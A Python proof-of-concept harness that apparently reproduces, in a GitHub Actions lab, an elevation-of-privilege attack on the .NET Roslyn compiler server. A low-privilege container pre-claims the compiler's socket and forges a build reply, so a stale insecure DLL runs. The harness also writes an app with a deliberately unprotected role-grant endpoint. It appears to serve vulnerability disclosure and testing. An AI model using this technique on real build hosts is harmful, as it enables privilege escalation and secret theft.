#!/usr/bin/env python3
"""Inert EOP02-EOP-062 proof through a real GitHub Actions service container."""
import hashlib
import base64
import json
import os
from pathlib import Path
import secrets
import shutil
import signal
import subprocess
import time
import urllib.error
import urllib.request

MODE = os.environ.get("EOP062_MODE", "completed")
assert MODE in ("completed", "malformed")
SUFFIX = f"{os.environ.get('GITHUB_RUN_ID', 'local')}-{os.getpid()}-{MODE}"
ROOT = Path(os.environ["GITHUB_WORKSPACE"]) / f".eop062-service-lab-{SUFFIX}"
ROOT.mkdir(mode=0o700)
SERVICE_ID = os.environ["EOP062_SERVICE_ID"]
NATURAL_IDLE = os.environ.get("EOP062_NATURAL_IDLE", "0") == "1"
PORT = 5162 if MODE == "completed" else 5163
OWNER = secrets.token_hex(32)
LOW = secrets.token_hex(32)
SECRET = secrets.token_hex(32)
SRC = ROOT / "src"
SRC.mkdir(mode=0o700)
ACTOR_DIR = Path("/tmp") / f"eop062-r14-service-actor-{SUFFIX}"
ACTOR_DIR.mkdir(mode=0o700)
shutil.copyfile(Path(__file__).with_name("eop062-fake-compiler.pl"), ACTOR_DIR / "fake.pl")
ROLE = SRC / "role.txt"
MARKER = SRC / "protected-admin-marker.txt"
PROGRAM = SRC / "Program.cs"
LOG = ROOT / "run.log"
app_proc = None
actor_proc = None

def run(args, *, check=True, capture=True, cwd=None):
    r = subprocess.run(args, text=True, stdout=subprocess.PIPE if capture else None,
                       stderr=subprocess.STDOUT if capture else None, check=False, cwd=cwd)
    if check and r.returncode:
        safe_args = [str(a).replace(OWNER, "<redacted-owner>").replace(LOW, "<redacted-low>").replace(SECRET, "<redacted-secret>") for a in args]
        safe_output = (r.stdout or "")[-2500:].replace(OWNER, "<redacted-owner>").replace(LOW, "<redacted-low>").replace(SECRET, "<redacted-secret>")
        raise RuntimeError(f"command failed rc={r.returncode}: {safe_args}\n{safe_output}")
    return r

def victim_exec(script, *, check=True):
    return run(["bash", "-c", script], check=check, cwd=SRC)

def assert_eq(label, got, want):
    if got != want:
        raise AssertionError(f"{label}: got {got!r}, want {want!r}")
    print(f"{label}={got}", flush=True)

def sha(path):
    return hashlib.sha256(path.read_bytes()).hexdigest()

def compiler_server_live():
    # Query the released SDK's exact default pipe without asking it to shut
    # down. Closing this short probe only resets the ordinary idle interval.
    pipe_name = base64.b64encode(hashlib.sha256(PIPE_INPUT.encode()).digest()).decode().replace("/", "_").rstrip("=")
    script = ("perl -MIO::Socket::UNIX -MSocket=SOCK_STREAM -e "
              f"'my $s=IO::Socket::UNIX->new(Type=>SOCK_STREAM,Peer=>q{{/tmp/{pipe_name}}},Timeout=>2); "
              "print $s ? q{LIVE} : q{ABSENT};'")
    return victim_exec(script).stdout.strip()

def http(path, token=None, owner=False):
    headers = {}
    if owner:
        headers["Authorization"] = "Owner " + OWNER
    elif token:
        headers["Authorization"] = "Bearer " + LOW
    req = urllib.request.Request(f"http://127.0.0.1:{PORT}{path}", data=b"", headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=3) as res:
            return res.status
    except urllib.error.HTTPError as ex:
        return ex.code

def protected_read(token=None, owner=False):
    headers = {}
    if owner:
        headers["Authorization"] = "Owner " + OWNER
    elif token:
        headers["Authorization"] = "Bearer " + LOW
    req = urllib.request.Request(f"http://127.0.0.1:{PORT}/admin/secret", headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=3) as res:
            return res.status, res.read().decode()
    except urllib.error.HTTPError as ex:
        return ex.code, None

def assert_secret(label, response):
    status, body = response
    body_hash = hashlib.sha256((body or "").encode()).hexdigest()
    expected_hash = hashlib.sha256(SECRET.encode()).hexdigest()
    if status != 200 or body_hash != expected_hash:
        raise AssertionError(f"{label}: status={status} body_sha256={body_hash} expected_sha256={expected_hash}")
    print(f"{label}=200 sha256={body_hash}", flush=True)

def await_http():
    for _ in range(200):
        try:
            with urllib.request.urlopen(f"http://127.0.0.1:{PORT}/health", timeout=1) as res:
                if res.status == 200:
                    return
        except (OSError, urllib.error.URLError):
            pass
        if app_proc.poll() is not None:
            raise RuntimeError(f"app exited early: {LOG.read_text()[-4000:]}")
        time.sleep(.25)
    raise TimeoutError(f"app did not start: {LOG.read_text()[-4000:]}")

def launch_app(label, no_build=False):
    global app_proc
    assert app_proc is None or app_proc.poll() is not None
    with LOG.open("a") as out:
        out.write(f"\n=== {label} ===\n")
    cmd = "dotnet run --no-launch-profile --no-restore -c Release"
    if no_build:
        cmd += " --no-build"
    cmd += f" --urls http://0.0.0.0:{PORT}"
    app_env = os.environ.copy()
    app_env.update({"EOP062_OWNER_TOKEN": OWNER, "EOP062_LOW_TOKEN": LOW,
                    "EOP062_PROTECTED_SECRET": SECRET, "EOP062_ROLE": str(ROLE),
                    "EOP062_MARKER": str(MARKER)})
    app_proc = subprocess.Popen(["bash", "-c", cmd], cwd=SRC, env=app_env,
                                stdout=LOG.open("a"), stderr=subprocess.STDOUT,
                                start_new_session=True)
    await_http()

def stop_app():
    global app_proc
    if app_proc and app_proc.poll() is None:
        os.killpg(app_proc.pid, signal.SIGTERM)
        try:
            app_proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            os.killpg(app_proc.pid, signal.SIGKILL)
            app_proc.wait(timeout=5)
    app_proc = None

def write_source(secure):
    auth = '.RequireAuthorization("Owner")' if secure else ''
    PROGRAM.write_text(r'''using System.Security.Claims;
using System.Text.Encodings.Web;
using Microsoft.AspNetCore.Authentication;
using Microsoft.Extensions.Options;

var builder = WebApplication.CreateBuilder(args);
builder.Services.AddAuthentication("Lab").AddScheme<AuthenticationSchemeOptions, LabAuthHandler>("Lab", _ => { });
builder.Services.AddAuthorization(options => {
    options.AddPolicy("Owner", policy => policy.RequireRole("Owner"));
    options.AddPolicy("Admin", policy => policy.RequireRole("Admin"));
});
var app = builder.Build();
app.UseAuthentication();
app.UseAuthorization();
app.MapGet("/health", () => Results.Ok("READY"));
app.MapPost("/grant", () => {
    File.WriteAllText(Environment.GetEnvironmentVariable("EOP062_ROLE")!, "low=Admin");
    return Results.Ok("ROLE_GRANTED");
})''' + auth + r''';
app.MapPost("/admin", () => {
    File.WriteAllText(Environment.GetEnvironmentVariable("EOP062_MARKER")!, "PROTECTED_INERT_MARKER_062");
    return Results.Ok("MARKER_WRITTEN");
}).RequireAuthorization("Admin");
app.MapGet("/admin/secret", () => Results.Text(Environment.GetEnvironmentVariable("EOP062_PROTECTED_SECRET")!))
   .RequireAuthorization("Admin");
app.Run();

sealed class LabAuthHandler : AuthenticationHandler<AuthenticationSchemeOptions> {
    public LabAuthHandler(IOptionsMonitor<AuthenticationSchemeOptions> options,
        ILoggerFactory logger, UrlEncoder encoder) : base(options, logger, encoder) { }
    protected override Task<AuthenticateResult> HandleAuthenticateAsync() {
        string header = Request.Headers.Authorization.ToString();
        string owner = Environment.GetEnvironmentVariable("EOP062_OWNER_TOKEN")!;
        string low = Environment.GetEnvironmentVariable("EOP062_LOW_TOKEN")!;
        string roleFile = Environment.GetEnvironmentVariable("EOP062_ROLE")!;
        if (header == "Owner " + owner) return Ticket("owner", "Owner", "Admin");
        if (header == "Bearer " + low) {
            bool admin = File.Exists(roleFile) && File.ReadAllText(roleFile) == "low=Admin";
            return admin ? Ticket("low", "Admin") : Ticket("low");
        }
        return Task.FromResult(AuthenticateResult.NoResult());
    }
    private Task<AuthenticateResult> Ticket(string name, params string[] roles) {
        var claims = new List<Claim> { new Claim(ClaimTypes.Name, name) };
        claims.AddRange(roles.Select(r => new Claim(ClaimTypes.Role, r)));
        var principal = new ClaimsPrincipal(new ClaimsIdentity(claims, "Lab"));
        return Task.FromResult(AuthenticateResult.Success(new AuthenticationTicket(principal, "Lab")));
    }
}
''')

try:
    print(f"MODE={MODE} SERVICE_ID={SERVICE_ID[:12]} NATURAL_IDLE={NATURAL_IDLE}", flush=True)
    assert_eq("RELEASED_SDK", victim_exec("dotnet --version").stdout.strip(), "11.0.100")
    print(f"RUNTIME={victim_exec('dotnet --list-runtimes').stdout.strip()}", flush=True)
    dotnet_exe = Path(shutil.which("dotnet")).resolve()
    compiler_dir = dotnet_exe.parent / "sdk/11.0.100/roslyn/bincore"
    assert_eq("COMPILER_DIRECTORY_EXISTS", compiler_dir.is_dir(), True)
    PIPE_INPUT = f"{victim_exec('id -un').stdout.strip()}.False.{compiler_dir}"
    host_uid = victim_exec("id -u").stdout.strip()
    actor_uid = run(["docker", "exec", SERVICE_ID, "id", "-u"]).stdout.strip()
    assert_eq("HOST_ACTOR_UID_MATCH", actor_uid, host_uid)
    gateway = run(["docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.Gateway}}{{end}}", SERVICE_ID]).stdout.strip()
    assert gateway
    print(f"ACTOR_GATEWAY={gateway}", flush=True)
    (SRC / "AdminApp.csproj").write_text('<Project Sdk="Microsoft.NET.Sdk.Web"><PropertyGroup><TargetFramework>net11.0</TargetFramework><ImplicitUsings>enable</ImplicitUsings></PropertyGroup></Project>\n')
    write_source(False)
    print("VICTIM_ID=" + victim_exec("id; id -un 2>&1", check=False).stdout.strip(), flush=True)
    victim_exec("dotnet build -c Release -p:UseSharedCompilation=false")
    dll = SRC / "bin/Release/net11.0/AdminApp.dll"
    old_hash = sha(dll)
    write_source(True)
    victim_exec("dotnet build -c Release -p:UseSharedCompilation=false")
    secure_hash = sha(dll)
    assert old_hash != secure_hash
    print(f"PUBLIC_DLL_SHA256={old_hash} SECURE_DLL_SHA256={secure_hash}", flush=True)
    launch_app("genuine-secure-baseline", no_build=True)
    assert_eq("BASELINE_LOW_GRANT", http("/grant", token=True), 403)
    assert_eq("BASELINE_LOW_ADMIN", http("/admin", token=True), 403)
    assert_eq("BASELINE_ANON_ADMIN", http("/admin"), 401)
    assert_eq("BASELINE_OWNER_ADMIN", http("/admin", owner=True), 200)
    assert_eq("BASELINE_LOW_SECRET_DENIED", protected_read(token=True)[0], 403)
    assert_eq("BASELINE_ANON_SECRET_DENIED", protected_read()[0], 401)
    assert_secret("BASELINE_OWNER_SECRET", protected_read(owner=True))
    run(["docker", "exec", "-e", f"EOP062_VICTIM_HOST={gateway}", "-e", f"EOP062_PORT={PORT}", SERVICE_ID,
         "perl", "-MIO::Socket::INET", "-e",
         "my $s=IO::Socket::INET->new(PeerAddr=>$ENV{EOP062_VICTIM_HOST},PeerPort=>$ENV{EOP062_PORT},Proto=>q{tcp},Timeout=>3); exit($s ? 0 : 1);"])
    print("ACTOR_NETWORK_TO_HOST=ALLOWED", flush=True)
    MARKER.unlink()
    assert not ROLE.exists()
    stop_app()

    # Leave ordinary public build output in both obj and bin. The prior run
    # copied only bin; its secure obj DLL was then copied back after the forged
    # compiler response, hiding the effect.
    write_source(False)
    time.sleep(1.2)
    victim_exec("dotnet build -c Release")
    obj_dll = SRC / "obj/Release/net11.0/AdminApp.dll"
    assert_eq("PUBLIC_RESIDUAL_BIN", sha(dll), old_hash)
    assert_eq("PUBLIC_RESIDUAL_OBJ", sha(obj_dll), old_hash)
    assert_eq("REAL_ROSLYN_SERVER_LIVE", compiler_server_live(), "LIVE")
    time.sleep(1.2)
    write_source(True)
    assert_eq("SECURED_SOURCE_WITH_RESIDUAL_BIN", sha(dll), old_hash)
    assert_eq("SECURED_SOURCE_WITH_RESIDUAL_OBJ", sha(obj_dll), old_hash)
    if NATURAL_IDLE:
        print("NATURAL_IDLE_WAIT_START seconds=675 no-shutdown-command=True", flush=True)
        time.sleep(675)
        assert_eq("REAL_ROSLYN_SERVER_AFTER_IDLE", compiler_server_live(), "ABSENT")
    else:
        victim_exec("dotnet build-server shutdown", check=False)
        assert_eq("REAL_ROSLYN_SERVER_AFTER_SHUTDOWN", compiler_server_live(), "ABSENT")
    actor_probe = """set -eu
test ! -e "$EOP062_SRC/Program.cs"
test ! -e "$EOP062_SRC/bin/Release/net11.0/AdminApp.dll"
test ! -e "/proc/1/root$EOP062_SRC/Program.cs"
test ! -e "/proc/1/root$EOP062_SRC/bin/Release/net11.0/AdminApp.dll"
test ! -e "/proc/1/root$EOP062_SRC/role.txt"
test ! -S /var/run/docker.sock
test ! -e "$EOP062_SRC/protected-admin-marker.txt"
test -z "${EOP062_OWNER_TOKEN:-}"
test -z "${EOP062_PROTECTED_SECRET:-}"
test -n "${EOP062_LOW_TOKEN:-}"
echo ACTOR_DIRECT_PATH_AND_OWNER_SECRET_DENIED
readlink /proc/self/ns/pid
readlink /proc/self/ns/mnt
readlink /proc/self/ns/net
"""
    actor_args = ["docker", "exec", "-e", f"EOP062_LOW_TOKEN={LOW}",
                  "-e", f"EOP062_SRC={SRC}", "-e", f"EOP062_PIPE_INPUT={PIPE_INPUT}",
                  "-e", f"EOP062_TARGET_DIR={SRC}",
                  "-e", f"EOP062_VICTIM_HOST={gateway}", SERVICE_ID]
    probe = run(actor_args + ["bash", "-lc", actor_probe]); print(probe.stdout, flush=True)
    victim_ns = victim_exec("readlink /proc/self/ns/pid; readlink /proc/self/ns/mnt; readlink /proc/self/ns/net").stdout.splitlines()
    actor_ns = probe.stdout.splitlines()[-3:]
    assert_eq("PID_NAMESPACE_SEPARATE", actor_ns[0] != victim_ns[0], True)
    assert_eq("MOUNT_NAMESPACE_SEPARATE", actor_ns[1] != victim_ns[1], True)
    assert_eq("NETWORK_NAMESPACE_SEPARATE", actor_ns[2] != victim_ns[2], True)
    vi = run(["docker", "inspect", "--format", "{{.HostConfig.PidMode}}", SERVICE_ID]).stdout.strip()
    assert_eq("ACTOR_PID_MODE", vi, "")

    with (ROOT / "actor.log").open("w") as out:
        actor_proc = subprocess.Popen(actor_args + ["perl", str(ACTOR_DIR / "fake.pl"), MODE, str(PORT)], stdout=out, stderr=subprocess.STDOUT)
    for _ in range(120):
        log = (ROOT / "actor.log").read_text()
        if "READY global=" in log:
            break
        if actor_proc.poll() is not None:
            raise RuntimeError("actor exited before ready: " + log)
        time.sleep(.25)
    else:
        raise TimeoutError("actor not ready: " + log)
    print("ACTOR_READY", flush=True)
    launch_app("single-dotnet-run-with-preclaimed-pipe")
    actor_proc.wait(timeout=15)
    actor_log = (ROOT / "actor.log").read_text()
    print(actor_log, flush=True)
    assert_eq("ACTOR_EXIT", actor_proc.returncode, 0)
    assert "REQUEST length=" in actor_log and "target=1" in actor_log
    assert ("SENT_COMPLETED_ZERO" if MODE == "completed" else "SENT_MALFORMED_LENGTH") in actor_log
    assert "ACTOR_BEFORE_ADMIN=403" in actor_log
    if MODE == "completed":
        assert "ACTOR_GRANT=200" in actor_log and "ACTOR_AFTER_ADMIN=200" in actor_log
        assert "ACTOR_SECRET_STATUS=200" in actor_log
        assert f"ACTOR_SECRET_SHA256={hashlib.sha256(SECRET.encode()).hexdigest()}" in actor_log
    else:
        assert "ACTOR_GRANT=403" in actor_log and "ACTOR_AFTER_ADMIN=403" in actor_log
        assert "ACTOR_SECRET_STATUS=403" in actor_log
    run_log = LOG.read_text()
    print("RUN_LOG_TAIL=" + run_log[-2500:].replace(OWNER, "<redacted-owner>").replace(LOW, "<redacted-low>").replace(SECRET, "<redacted-secret>"), flush=True)
    if MODE == "completed":
        assert_eq("RAN_STALE_DLL", sha(dll), old_hash)
        assert_eq("ACTOR_SELF_GRANT_CONFIRMED", ROLE.read_text(), "low=Admin")
        assert_eq("POST_GRANT_LOW_ADMIN", http("/admin", token=True), 200)
        assert_eq("ROLE_PERSISTED", ROLE.read_text(), "low=Admin")
        assert_eq("PROTECTED_MARKER", MARKER.read_text(), "PROTECTED_INERT_MARKER_062")
        assert_secret("PROTECTED_SECRET_READ", protected_read(token=True))
        stop_app()
        victim_exec("dotnet build -c Release -p:UseSharedCompilation=false")
        assert_eq("GENUINE_REBUILD_SECURE_DLL", sha(dll), secure_hash)
        launch_app("post-genuine-rebuild", no_build=True)
        assert_eq("POST_REBUILD_LOW_GRANT", http("/grant", token=True), 403)
        assert_eq("POST_REBUILD_LOW_ADMIN", http("/admin", token=True), 200)
        assert_eq("POST_REBUILD_ANON_ADMIN", http("/admin"), 401)
        assert_secret("POST_REBUILD_LOW_SECRET_READ", protected_read(token=True))
    else:
        assert_eq("MALFORMED_SECURE_DLL", sha(dll), secure_hash)
        assert_eq("MALFORMED_LOW_GRANT", http("/grant", token=True), 403)
        assert_eq("MALFORMED_LOW_ADMIN", http("/admin", token=True), 403)
        assert_eq("MALFORMED_ROLE_ABSENT", ROLE.exists(), False)
        assert_eq("MALFORMED_MARKER_ABSENT", MARKER.exists(), False)
        assert_eq("MALFORMED_SECRET_DENIED", protected_read(token=True)[0], 403)
    print(f"RESULT=PASS MODE={MODE}", flush=True)
except Exception:
    # Diagnostic only: preserve the causal fork when a runner fails. The two
    # generated credentials are never published in logs.
    if (ROOT / "actor.log").exists():
        data = (ROOT / "actor.log").read_text()[-3500:]
        print("ACTOR_LOG_TAIL=" + data.replace(OWNER, "<redacted-owner>").replace(LOW, "<redacted-low>").replace(SECRET, "<redacted-secret>"), flush=True)
    if LOG.exists():
        data = LOG.read_text()[-3500:]
        print("RUN_LOG_TAIL=" + data.replace(OWNER, "<redacted-owner>").replace(LOW, "<redacted-low>").replace(SECRET, "<redacted-secret>"), flush=True)
    if (SRC / "bin/Release/net11.0/AdminApp.dll").exists():
        print("FAILURE_DLL_SHA256=" + sha(SRC / "bin/Release/net11.0/AdminApp.dll"), flush=True)
    raise
finally:
    stop_app()
    if actor_proc and actor_proc.poll() is None:
        actor_proc.terminate()
        try: actor_proc.wait(timeout=5)
        except subprocess.TimeoutExpired: actor_proc.kill()
    # GitHub owns the service lifecycle and removes its container at job end.
    # Retain logs on runner while the job lives; no passwords or tokens were logged.
    print(f"EVIDENCE_DIR={ROOT}", flush=True)
